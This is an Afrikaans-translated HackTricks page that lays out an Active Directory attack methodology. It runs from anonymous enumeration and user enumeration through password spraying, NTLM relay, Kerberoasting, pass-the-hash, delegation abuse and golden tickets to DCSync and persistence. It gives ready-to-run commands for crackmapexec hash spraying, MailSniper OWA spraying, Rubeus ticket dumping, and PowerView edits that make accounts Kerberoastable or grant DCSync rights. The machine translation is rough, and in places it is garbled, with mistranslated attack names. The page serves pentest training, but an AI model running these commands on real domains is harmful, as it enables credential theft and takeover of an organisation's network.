# Aktiewe Gids Metodologie

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese oorsig

**Aktiewe Gids** dien as 'n fundamentele tegnologie, wat **netwerkadministrateurs** in staat stel om doeltreffend **domeine**, **gebruikers**, en **voorwerpe** binne 'n netwerk te skep en te bestuur. Dit is ontwerp om te skaal, wat die organisasie van 'n groot aantal gebruikers in bestuurbare **groepe** en **subgroepe** fasiliteer, terwyl dit **toegangsregte** op verskeie vlakke beheer.

Die struktuur van **Aktiewe Gids** bestaan uit drie primêre lae: **domeine**, **bome**, en **woude**. 'n **Domein** omvat 'n versameling voorwerpe, soos **gebruikers** of **toestelle**, wat 'n gemeenskaplike databasis deel. **Bome** is groepe van hierdie domeine wat deur 'n gemeenskaplike struktuur gekoppel is, en 'n **woud** verteenwoordig die versameling van verskeie bome wat deur **vertrouensverhoudings** met mekaar verbind is, wat die boonste laag van die organisasiestruktuur vorm. Spesifieke **toegangs** en **kommunikasie regte** kan op elkeen van hierdie vlakke aangewys word.

Kernkonsepte binne **Aktiewe Gids** sluit in:

1. **Gids** – Bevat alle inligting rakende Aktiewe Gidsvoorwerpe.
2. **Voorwerp** – Dui entiteite binne die gids aan, insluitend **gebruikers**, **groepe**, of **gedeelde lêers**.
3. **Domein** – Diens as 'n houer vir gidvoorwerpe, met die vermoë vir meervoudige domeine om binne 'n **woud** te bestaan, elk met sy eie voorwerpversameling.
4. **Boom** – 'n Groepering van domeine wat 'n gemeenskaplike hoofdomein deel.
5. **Woud** – Die hoogtepunt van die organisasiestruktuur in Aktiewe Gids, saamgestel uit verskeie bome met **vertrouensverhoudings** tussen hulle.

**Aktiewe Gidsdienste (AD DS)** omvat 'n reeks dienste wat krities is vir die gesentraliseerde bestuur en kommunikasie binne 'n netwerk. Hierdie dienste sluit in:

1. **Domeindienste** – Sentraliseer data-opberging en bestuur interaksies tussen **gebruikers** en **domeine**, insluitend **verifikasie** en **soekfunksies**.
2. **Sertifikaatdienste** – Oorsien die skepping, verspreiding, en bestuur van veilige **digitale sertifikate**.
3. **Ligte Gidsdienste** – Ondersteun gidsgeaktiveerde toepassings deur die **LDAP-protokol**.
4. **Gidsfederasiedienste** – Verskaf **enkel-aanmelding**-vermoëns om gebruikers oor verskeie webtoepassings in 'n enkele sessie te verifieer.
5. **Regtebestuur** – Help om kopieregsmateriaal te beskerm deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS-diens** – Krities vir die oplossing van **domeinname**.

Vir 'n meer gedetailleerde verduideliking, kyk na: [**TechTerms - Aktiewe Gidsdefinisie**](https://techterms.com/definition/active\_directory)

### **Kerberos-verifikasie**

Om te leer hoe om 'n **AD aan te val** moet jy die **Kerberos-verifikasieproses** regtig goed verstaan.\
[**Lees hierdie bladsy as jy nog nie weet hoe dit werk nie.**](kerberos-authentication.md)

## Spiekbrief

Jy kan na [https://wadcoms.github.io/](https://wadcoms.github.io) gaan om 'n vinnige oorsig te kry van watter opdragte jy kan hardloop om 'n AD te ontleed/uit te buit.

## Opname van Aktiewe Gids (Geen geloofsbriewe/sessies)

As jy net toegang het tot 'n AD-omgewing maar jy het geen geloofsbriewe/sessies nie, kan jy:

* **Pentest die netwerk:**
* Skandeer die netwerk, vind masjiene en oop poorte en probeer **kwesbaarhede uit te buit** of **geloofsbriewe daaruit te onttrek** (byvoorbeeld, [drukkers kan baie interessante teikens wees](ad-information-in-printers.md).
* Die opname van DNS kan inligting gee oor sleutelbedieners in die domein soos web, drukkers, aandele, vpn, media, ens.
* `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
* Kyk na die Algemene [**Pentestmetodologie**](../../generic-methodologies-and-resources/pentesting-methodology.md) om meer inligting te vind oor hoe om dit te doen.
* **Kyk vir nul en Gaskragtoegang op smb-dienste** (dit sal nie werk op moderne Windows-weergawes nie):
* `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
* `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
* `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
* 'n Meer gedetailleerde gids oor hoe om 'n SMB-bediener te ontleed kan hier gevind word:

{% content-ref url="../../network-services-pentesting/pentesting-smb/" %}
[pentesting-smb](../../network-services-pentesting/pentesting-smb/)
{% endcontent-ref %}

* **Ontleed Ldap**
* `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
* 'n Meer gedetailleerde gids oor hoe om LDAP te ontleed kan hier gevind word (gee **spesiale aandag aan die anonieme toegang**):

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

* **Vergiftig die netwerk**
* Versamel geloofsbriewe deur [**dienste te impersoneer met Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
* Toegang tot gasheer deur [**misbruik te maak van die relaasaanval**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
* Versamel geloofsbriewe deur **vals UPnP-dienste bloot te stel met evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
* [**OSINT**](https://book.hacktricks.xyz/external-recon-methodology):
* Onttrek gebruikersname/names uit interne dokumente, sosiale media, dienste (hoofsaaklik web) binne die domeinomgewings en ook van die publiek beskikbaar.
* As jy die volledige name van maatskappywerkers vind, kan jy verskillende AD **gebruikersnaamkonvensies probeer (**[**lees dit**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die mees algemene konvensies is: _NaamVan_, _Naam.Van_, _NaamVan_ (3letters van elkeen), _Naam.Van_, _NVan_, _N.Van_, _VanNaam_, _Van.Naam_, _VanN_, _Van.N_, 3 _willekeurige letters en 3 willekeurige nommers_ (abc123).
* Gereedskap:
* [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
* [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)
### Gebruikeropsomming

* **Anonieme SMB/LDAP-opsomming:** Kyk na die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/) en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) bladsye.
* **Kerbrute-opsomming**: Wanneer 'n **ongeldige gebruikersnaam aangevra** word, sal die bediener reageer met die **Kerberos-foutkode** _KRB5KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN_, wat ons in staat stel om te bepaal dat die gebruikersnaam ongeldig was. **Geldige gebruikersname** sal óf die **TGT in 'n AS-REP**-reaksie veroorsaak, óf die fout _KRB5KDC\_ERR\_PREAUTH\_REQUIRED_, wat aandui dat die gebruiker verplig is om vooraf-verifikasie uit te voer.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
```
* **OWA (Outlook Web Access) Bediener**

Indien jy een van hierdie bedieners in die netwerk gevind het, kan jy ook **gebruiker opsomming teen dit uitvoer**. Byvoorbeeld, jy kan die werktuig [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
{% hint style="warning" %}
Jy kan lyste van gebruikersname vind in [**hierdie github-opberging**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) en hierdie een ([**statisties-waarskynlike-gebruikersname**](https://github.com/insidetrust/statistically-likely-usernames)).

Nietemin, jy behoort die **name van die mense wat by die maatskappy werk** te hê van die rekogniseringstap wat jy voor hierdie stap moes uitgevoer het. Met die naam en van die persoon kan jy die skrip [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om potensiële geldige gebruikersname te genereer.
{% endhint %}

### Kennis van een of verskeie gebruikersname

Ok, so jy weet jy het reeds 'n geldige gebruikersnaam maar geen wagwoorde nie... Probeer dan:

* [**ASREPRoast**](asreproast.md): As 'n gebruiker **nie** die eienskap _DONT\_REQ\_PREAUTH_ het nie, kan jy 'n AS\_REP-boodskap vir daardie gebruiker aanvra wat sekere data versleutel deur 'n afleiding van die wagwoord van die gebruiker sal bevat.
* [**Wagwoord Spraying**](password-spraying.md): Laat ons die mees **gewone wagwoorde** probeer met elkeen van die ontdekte gebruikers, miskien gebruik 'n gebruiker 'n swak wagwoord (hou die wagwoordbeleid in gedagte!).
* Let daarop dat jy ook **OWA-bedieners kan besproei** om toegang tot die gebruikers se posbedieners te probeer kry.

{% content-ref url="password-spraying.md" %}
[password-spraying.md](password-spraying.md)
{% endcontent-ref %}

### LLMNR/NBT-NS Vergiftiging

Jy mag dalk in staat wees om sekere uitdagings **hasse** te verkry om te kraak deur sommige protokolle van die **netwerk te vergiftig**:

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### NTML Oordrag

As jy die aktiewe gids geënumereer het, sal jy **meer e-posse en 'n beter begrip van die netwerk** hê. Jy mag in staat wees om NTML [**oordraagaanvalle**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) te dwing om toegang tot die AD-omgewing te kry.

### Steel NTLM Krediete

As jy **toegang tot ander rekenaars of aandele** met die **nul- of gasgebruiker** kan kry, kan jy lêers plaas (soos 'n SCF-lêer) wat, indien op een of ander manier geaktiveer, 'n NTML-verifikasie teen jou sal **aanhits** sodat jy die **NTLM-uitdaging** kan steel om dit te kraak:

{% content-ref url="../ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

## Enumerering van die Aktiewe Gids MET geloofsbriewe/sessie

Vir hierdie fase moet jy die **geloofsbriewe of 'n sessie van 'n geldige domeinrekening gekompromitteer het.** As jy enige geldige geloofsbriewe het of 'n skul as 'n domeingebruiker het, **onthou dat die opsies wat voorheen gegee is steeds opsies is om ander gebruikers te kompromitteer**.

Voordat jy met die geauthentiseerde enumerering begin, moet jy weet wat die **Kerberos-dubbelhop-probleem** is.

{% content-ref url="kerberos-double-hop-problem.md" %}
[kerberos-double-hop-problem.md](kerberos-double-hop-problem.md)
{% endcontent-ref %}

### Enumerering

Om 'n rekening gekompromitteer te hê, is 'n **groot stap om die hele domein te begin kompromitteer**, omdat jy in staat gaan wees om die **Aktiewe Gids Enumerering te begin:**

Met betrekking tot [**ASREPRoast**](asreproast.md) kan jy nou elke moontlike kwesbare gebruiker vind, en met betrekking tot [**Wagwoord Spraying**](password-spraying.md) kan jy 'n **lys van al die gebruikersname** kry en die wagwoord van die gekompromitteerde rekening, leë wagwoorde en nuwe belowende wagwoorde probeer.

* Jy kan die [**CMD gebruik om 'n basiese rekognisering uit te voer**](../basic-cmd-for-pentesters.md#domain-info)
* Jy kan ook [**powershell vir rekognisering gebruik**](../basic-powershell-for-pentesters/) wat meer onopvallend sal wees
* Jy kan ook [**powerview gebruik**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te onttrek
* 'n Ander wonderlike instrument vir rekognisering in 'n aktiewe gids is [**BloodHound**](bloodhound.md). Dit is **nie baie onopvallend nie** (afhangende van die versamelingsmetodes wat jy gebruik nie), maar **as jy nie omgee nie** daaroor, moet jy dit beslis probeer. Vind waar gebruikers kan RDP, vind pad na ander groepe, ens.
* **Ander geoutomatiseerde AD-enumereringstools is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
* [**DNS-rekords van die AD**](ad-dns-records.md) aangesien dit dalk interessante inligting kan bevat.
* 'n **Instrument met GUI** wat jy kan gebruik om die gids te onttrek is **AdExplorer.exe** van **SysInternal** Suite.
* Jy kan ook in die LDAP-databasis soek met **ldapsearch** om te soek na geloofsbriewe in velde _userPassword_ & _unixUserPassword_, of selfs vir _Beskrywing_. sien [Wagwoord in AD-gebruikeropmerking op PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander metodes.
* As jy **Linux** gebruik, kan jy ook die domein onttrek met [**pywerview**](https://github.com/the-useless-one/pywerview).
* Jy kan ook geoutomatiseerde gereedskap probeer soos:
* [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
* [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
*   **Alle domeingebruikers onttrek**

Dit is baie maklik om al die domeingebruikersname van Windows te verkry (`net user /domain`, `Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumerering-seksie klein, is dit die belangrikste deel van alles. Besoek die skakels (veral die een van cmd, powershell, powerview en BloodHound), leer hoe om 'n domein te onttrek en oefen totdat jy gemaklik voel. Tydens 'n assessering sal hierdie die sleutelmoment wees om jou pad na DA te vind of om te besluit dat niks gedoen kan word nie.

### Kerberoast

Kerberoasting behels die verkryging van **TGS-kaartjies** wat deur dienste wat aan gebruikersrekeninge gekoppel is, gebruik word en hul versleuteling kraak—wat gebaseer is op gebruikerswagwoorde—**offline**.

Meer hieroor in:

{% content-ref url="kerberoast.md" %}
[kerberoast.md](kerberoast.md)
{% endcontent-ref %}
### Remote verbinding (RDP, SSH, FTP, Win-RM, ens.)

Sodra jy sekere geloofsbriewe verkry het, kan jy nagaan of jy toegang het tot enige **rekenaar**. Hiervoor kan jy **CrackMapExec** gebruik om te probeer om op verskeie bedieners aan te sluit met verskillende protokolle, ooreenkomstig jou poortskanderings.

### Plaaslike Bevoorregte Escalatie

As jy gekompromitteerde geloofsbriewe het of 'n sessie as 'n gewone domein-gebruiker en jy het **toegang** met hierdie gebruiker tot **enige rekenaar in die domein**, moet jy probeer om jou pad te vind om plaaslike bevoorregte te eskaleer en te plunder vir geloofsbriewe. Dit is omdat slegs met plaaslike administrateurbevoegdhede jy in staat sal wees om hasjwaardes van ander gebruikers in geheue (LSASS) en plaaslik (SAM) te **dump**.

Daar is 'n volledige bladsy in hierdie boek oor [**plaaslike bevoorregte escalatie in Windows**](../windows-local-privilege-escalation/) en 'n [**kontrollys**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Huidige Sessiekaartjies

Dit is baie **onwaarskynlik** dat jy **kaartjies** sal vind in die huidige gebruiker wat jou toestemming gee om toegang te verkry tot onverwagte bronne, maar jy kan nagaan:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTML Relay

As jy daarin geslaag het om die aktiewe gids te ontleed, sal jy **meer e-posse en 'n beter begrip van die netwerk** hê. Jy mag dalk in staat wees om NTML [**relay-aanvalle**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** te dwing**.

### **Soek na Creds in Rekenaar-aandele**

Nou dat jy 'n paar basiese geloofsbriewe het, moet jy nagaan of jy enige **interessante lêers wat binne die AD gedeel word**, kan **vind**. Jy kan dit handmatig doen, maar dit is 'n baie vervelige herhalende taak (en meer as jy honderde dokumente moet nagaan).

[**Volg hierdie skakel om meer te leer oor gereedskap wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/#domain-shared-folders-search)

### Steel NTLM Creds

As jy **toegang tot ander rekenaars of aandele kan kry**, kan jy **lêers plaas** (soos 'n SCF-lêer) wat, as dit op een of ander manier geaktiveer word, 'n NTML-outentifikasie teen jou sal **aanhits** sodat jy die **NTLM-uitdaging** kan **steel** om dit te kraak:

{% content-ref url="../ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geoutentiseerde gebruiker toegelaat om die domeinbeheerder te **kompromitteer**.

{% content-ref url="printnightmare.md" %}
[printnightmare.md](printnightmare.md)
{% endcontent-ref %}

## Voorreg-escalasie op Aktiewe Gids MET bevoorregte geloofsbriewe/sessie

**Vir die volgende tegnieke is 'n gewone domeingebruiker nie genoeg nie, jy het spesiale voorregte/geloofsbriewe nodig om hierdie aanvalle uit te voer.**

### Hasj-ontginning

Hopelik het jy daarin geslaag om **'n paar plaaslike administrateur-geloofsbriewe te kry** deur gebruik te maak van [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) insluitende relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [voorregte plaaslik te verhoog](../windows-local-privilege-escalation/).\
Dan is dit tyd om al die hasjwaardes in die geheue en plaaslik te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hasjwaardes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Gee die Hasj deur

**Sodra jy die hasj van 'n gebruiker het**, kan jy dit gebruik om hom te **impersoneer**.\
Jy moet 'n **gereedskap** gebruik wat die **NTLM-outentifisering met daardie hasj sal uitvoer**, **of** jy kan 'n nuwe **sessieaanmelding** skep en daardie **hasj** binne die **LSASS** inspuit, sodat wanneer enige **NTLM-outentifisering uitgevoer word**, daardie **hasj gebruik sal word**. Die laaste opsie is wat mimikatz doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/#pass-the-hash)

### Oor Gee die Hasj/ Gee die Sleutel

Hierdie aanval is daarop gemik om die gebruiker se NTLM-hasj te gebruik om Kerberos-kaartjies aan te vra, as 'n alternatief vir die gewone Gee die Hasj oor NTLM-protokol. Daarom kan dit veral **nuttig wees in netwerke waar die NTLM-protokol gedeaktiveer is** en slegs **Kerberos toegelaat word** as outentiseringsprotokol.

{% content-ref url="over-pass-the-hash-pass-the-key.md" %}
[over-pass-the-hash-pass-the-key.md](over-pass-the-hash-pass-the-key.md)
{% endcontent-ref %}

### Gee die Kaartjie deur

In die **Gee die Kaartjie (PTT)** aanvalsmetode **steel aanvallers 'n gebruiker se outentiseringskaartjie** in plaas van hul wagwoord of hasjwaardes. Hierdie gesteelde kaartjie word dan gebruik om die gebruiker te **impersoneer**, wat ongemagtigde toegang tot hulpbronne en dienste binne 'n netwerk gee.

{% content-ref url="pass-the-ticket.md" %}
[pass-the-ticket.md](pass-the-ticket.md)
{% endcontent-ref %}

### Geloofsbriewe Hergebruik

As jy die **hasj** of **wagwoord** van 'n **plaaslike administrateur** het, moet jy probeer om **plaaslik aan te meld** by ander **rekenaars** daarmee.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
{% hint style="warning" %}
Let wel dat dit nogal **lawaaierig** is en **LAPS** dit sou **versag**.
{% endhint %}

### MSSQL Misbruik & Vertroue Skakels

As 'n gebruiker die voorregte het om **toegang tot MSSQL-instanties** te hê, kan hy dit gebruik om bevele uit te voer op die MSSQL-gashuis (as dit as SA hardloop), die NetNTLM **hash steel** of selfs 'n **relay-aanval** uit te voer.\
Ook, as 'n MSSQL-instantie vertrou word (databasis skakel) deur 'n ander MSSQL-instantie. As die gebruiker voorregte het oor die vertroue databasis, sal hy in staat wees om die vertrouensverhouding te gebruik om ook navrae in die ander instansie uit te voer. Hierdie vertrouensverhoudings kan geketting word en op 'n stadium mag die gebruiker 'n verkeerd geconfigureerde databasis vind waar hy bevele kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor bosvertrouens.**

{% content-ref url="abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](abusing-ad-mssql.md)
{% endcontent-ref %}

### Onbeperkte Delegering

As jy enige Rekenaarobjek met die eienskap [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) vind en jy het domeinvoorregte op die rekenaar, sal jy in staat wees om TGT's uit die geheue van elke gebruiker wat op die rekenaar inlog, te dump.\
Dus, as 'n **Domein Admin op die rekenaar inlog**, sal jy sy TGT kan dump en hom kan impersoneer deur [Pass the Ticket](pass-the-ticket.md) te gebruik.\
Dankie aan beperkte delegering kan jy selfs **outomaties 'n Drukkerbediener kompromitteer** (hopelik sal dit 'n DC wees).

{% content-ref url="unconstrained-delegation.md" %}
[unconstrained-delegation.md](unconstrained-delegation.md)
{% endcontent-ref %}

### Beperkte Delegering

As 'n gebruiker of rekenaar toegelaat word vir "Beperkte Delegering" sal dit in staat wees om **enige gebruiker te impersoneer om toegang tot sekere dienste op 'n rekenaar te verkry**.\
Dan, as jy die hash van hierdie gebruiker/rekenaar **kompromitteer**, sal jy in staat wees om **enige gebruiker te impersoneer** (selfs domein-administrateurs) om toegang tot sekere dienste te verkry.

{% content-ref url="constrained-delegation.md" %}
[constrained-delegation.md](constrained-delegation.md)
{% endcontent-ref %}

### Hulpbron-gebaseerde Beperkte Delegering

Die hê **SKRYF**-voorreg op 'n Active Directory-objek van 'n afgeleë rekenaar maak die verkryging van kode-uitvoering met **verhoogde voorregte** moontlik:

{% content-ref url="resource-based-constrained-delegation.md" %}
[resource-based-constrained-delegation.md](resource-based-constrained-delegation.md)
{% endcontent-ref %}

### ACL-misbruik

Die gekompromitteerde gebruiker kan sekere **interessante voorregte oor sekere domeinobjekte** hê wat jou kan laat **beweeg** lateraal/**voorregte eskaleer**.

{% content-ref url="acl-persistence-abuse/" %}
[acl-persistence-abuse](acl-persistence-abuse/)
{% endcontent-ref %}

### Drukker Spooler-diensmisbruik

Die ontdekking van 'n **Spool-diens wat luister** binne die domein kan misbruik word om nuwe geloofsbriewe te **verkry** en **voorregte te eskaleer**.

{% content-ref url="acl-persistence-abuse/" %}
[acl-persistence-abuse](acl-persistence-abuse/)
{% endcontent-ref %}

### Misbruik van derdeparty-sessies

As **ander gebruikers** die **gekompromitteerde** masjien **toegang** kry, is dit moontlik om geloofsbriewe uit die geheue te **versamel** en selfs **beacons in hul prosesse in te spuit** om hulle te impersoneer.\
Gewoonlik sal gebruikers die stelsel via RDP benader, so hier is hoe om 'n paar aanvalle oor derdeparty-RDP-sessies uit te voer:

{% content-ref url="rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](rdp-sessions-abuse.md)
{% endcontent-ref %}

### LAPS

**LAPS** bied 'n stelsel vir die bestuur van die **plaaslike Administrateur wagwoord** op domein-gekoppelde rekenaars, wat verseker dat dit **willekeurig**, uniek, en gereeld **verander** word. Hierdie wagwoorde word gestoor in Active Directory en toegang word beheer deur ACL's slegs aan gemagtigde gebruikers. Met voldoende toestemming om hierdie wagwoorde te benader, word die skuif na ander rekenaars moontlik.

{% content-ref url="laps.md" %}
[laps.md](laps.md)
{% endcontent-ref %}

### Sertifikaatdiefstal

**Die versameling van sertifikate** van die gekompromitteerde masjien kan 'n manier wees om voorregte binne die omgewing te eskaleer:

{% content-ref url="ad-certificates/certificate-theft.md" %}
[certificate-theft.md](ad-certificates/certificate-theft.md)
{% endcontent-ref %}

### Sertifikaatsjabloonmisbruik

As **kwesbare sjablone** gekonfigureer is, is dit moontlik om dit te misbruik om voorregte te eskaleer:

{% content-ref url="ad-certificates/domain-escalation.md" %}
[domain-escalation.md](ad-certificates/domain-escalation.md)
{% endcontent-ref %}

## Post-uitbuiting met 'n hoë voorregte-rekening

### Dumping van Domein-geloofsbriewe

Sodra jy **Domein Admin** of selfs beter **Ondernemings Admin** voorregte kry, kan jy die **domein-databasis** dump: _ntds.dit_.

[**Meer inligting oor DCSync-aanval kan hier gevind word**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steel kan hier gevind word**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Volharding

Sommige van die tegnieke wat voorheen bespreek is, kan vir volharding gebruik word.\
Byvoorbeeld kan jy:

*   Maak gebruikers kwesbaar vir [**Kerberoast**](kerberoast.md)

```powershell
Set-DomainObject -Identity <gebruikersnaam> -Set @{serviceprincipalname="vals/NIKS"}r
```
*   Maak gebruikers kwesbaar vir [**ASREPRoast**](asreproast.md)

```powershell
Set-DomainObject -Identity <gebruikersnaam> -XOR @{UserAccountControl=4194304}
```
*   Verleen [**DCSync**](./#dcsync) voorregte aan 'n gebruiker

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silwermatriek

Die **Silwermatriek-aanval** skep 'n **wettige Tikkie-verleningsdiens (TGS) tikkie** vir 'n spesifieke diens deur die **NTLM-hash** te gebruik (byvoorbeeld die **hash van die Rekenaarrekening**). Hierdie metode word gebruik om toegang tot die diensvoorregte te verkry.

{% content-ref url="silver-ticket.md" %}
[silver-ticket.md](silver-ticket.md)
{% endcontent-ref %}

### Goue Tikkie

'n **Goue Tikkie-aanval** behels 'n aanvaller wat toegang kry tot die **NTLM-hash van die krbtgt-rekening** in 'n Active Directory (AD) omgewing. Hierdie rekening is spesiaal omdat dit gebruik word om alle **Tikkie-verlenings-tikkette (TGT's)** te teken, wat noodsaaklik is vir die outentisering binne die AD-netwerk.

Sodra die aanvaller hierdie hash verkry, kan hulle **TGT's** vir enige rekening wat hulle kies, skep (Silwermatriek-aanval).

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### Diamant Tikkie

Hierdie is soos goue tikkette wat op 'n manier vervals is wat **gewone goue tikkette-deteksie-meganismes omseil**.

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}
### **Sertifikate-rekening Volharding**

**Die hê van sertifikate van 'n rekening of die vermoë om dit aan te vra** is 'n baie goeie manier om in die gebruikersrekening vol te hou (selfs as hy die wagwoord verander):

{% content-ref url="ad-certificates/account-persistence.md" %}
[account-persistence.md](ad-certificates/account-persistence.md)
{% endcontent-ref %}

### **Sertifikate Domein Volharding**

**Dit is ook moontlik om met sertifikate vol te hou met hoë voorregte binne die domein:**

{% content-ref url="ad-certificates/domain-persistence.md" %}
[domain-persistence.md](ad-certificates/domain-persistence.md)
{% endcontent-ref %}

### AdminSDHolder Groep

